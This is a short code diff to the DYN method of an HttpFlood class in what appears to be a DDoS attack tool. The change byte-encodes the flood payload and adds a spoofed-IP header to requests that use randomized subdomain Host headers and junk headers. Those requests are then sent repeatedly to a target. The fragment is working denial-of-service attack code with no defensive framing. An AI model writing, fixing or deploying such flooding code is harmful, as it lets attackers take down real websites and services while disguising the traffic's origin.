@@ -758,10 +758,10 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def DYN(self):
-        payload: str | bytes = (self._payload +
+        payload: str | bytes = str.encode(self._payload +
                                 "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
                                 self.randHeadercontent +
-                                "\r\n")
+                                self.SpoofIP +"\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
